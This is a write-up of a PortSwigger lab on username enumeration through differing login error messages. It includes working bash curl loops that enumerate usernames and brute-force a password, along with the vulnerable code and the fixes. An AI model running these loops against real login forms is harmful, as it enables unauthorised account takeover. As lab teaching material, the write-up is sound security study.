---
layout: post
title: "PortSwigger: Username Enumeration via Different Responses"
date: 2027-10-04 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, Authentication]
tags: [portswigger, authentication, username-enumeration, brute-force, login, cwe-204]
---

A login form has one job and one secret to keep: when a sign-in fails, it must never reveal *which* field was wrong. The moment it tells you "that username doesn't exist" versus "wrong password for that account," it has handed an attacker a list of which accounts are real — and a real account is a brute-force you can actually win. ([CWE-204](https://cwe.mitre.org/data/definitions/204.html), Observable Response Discrepancy.)

## Overview

The lab hands you two wordlists (one of [candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames), one of [candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)) and a standard login form that POSTs `username` and `password` to `/login`. The goal is to find the one valid account and log in.

## Step 1 — the username oracle

Submit a username that obviously doesn't exist and watch the error message:

```
POST /login
username=zzznotreal&password=wrongpass

→ "Invalid username"
```

Now submit a username that *does* exist with the same junk password, and the message changes:

```
POST /login
username=accounting&password=wrongpass

→ "Incorrect password"
```

That difference is the whole vulnerability. The server checks the username first and reports `Invalid username` if it doesn't exist; only if the account is real does it move on to the password check and report `Incorrect password`. The response is now an **oracle** that answers a yes/no question — *does this account exist?* — so we just loop the username list and flag anything that isn't the `Invalid username` baseline:

```bash
for u in $(cat usernames.txt); do
  m=$(curl -sk "$URL/login" --data-urlencode "username=$u" --data-urlencode 'password=x' \
        | grep -oiE 'Invalid username|Incorrect password')
  [ "$m" != 'Invalid username' ] && echo "VALID: $u ($m)"
done
# -> VALID: accounting (Incorrect password)
```

One hit: **`accounting`**.

> The tell isn't always the error string. The same leak shows up as a different response *length*, a different *status code*, or even a *timing* difference — the server only runs the (slow) password-hash comparison for usernames that actually exist, so valid accounts answer measurably slower. Always baseline a known-bad value first, then look for *any* deviation.

## Step 2 — the password oracle

With a valid username in hand, the two-field guess collapses into a single password brute. And there's a second oracle waiting: a failed login re-renders the form with **HTTP 200**, while a successful login issues an **HTTP 302** redirect to `/my-account`. So the status code alone tells us when we've won — no body parsing required:

```bash
for p in $(cat passwords.txt); do
  c=$(curl -sk -o /dev/null -w '%{http_code}' "$URL/login" \
        --data-urlencode 'username=accounting' --data-urlencode "password=$p")
  [ "$c" = '302' ] && { echo "PASS FOUND: $p"; break; }
done
# -> PASS FOUND: 777777
```

Credentials recovered: **`accounting:777777`**. Logging in and following the redirect to `/my-account` flips the lab banner to **Solved**.

## Why it works

```python
if not user_exists(u):
    return "Invalid username"     # leaks: account does NOT exist
if not check_pw(u, p):
    return "Incorrect password"   # leaks: account DOES exist
```

Two distinct failure paths produce two distinct outputs, and any observable difference between them — text, length, status, or timing — is enough to enumerate. Username enumeration on its own is "only" information disclosure, but here it chains straight into account takeover because there's no rate limit and the password space is small.

## The fix

- Return a single **generic** message for every failed login: *"Invalid username or password."*
- Make both code paths **constant-time** — always run the password-hash comparison, even when the username is unknown, so timing can't be used as an oracle.
- Keep response **length, headers, and status code identical** across both outcomes.
- Add **rate limiting / lockout** (per account and per IP) plus CAPTCHA, so even a confirmed username can't be brute-forced ([CWE-307](https://cwe.mitre.org/data/definitions/307.html)).
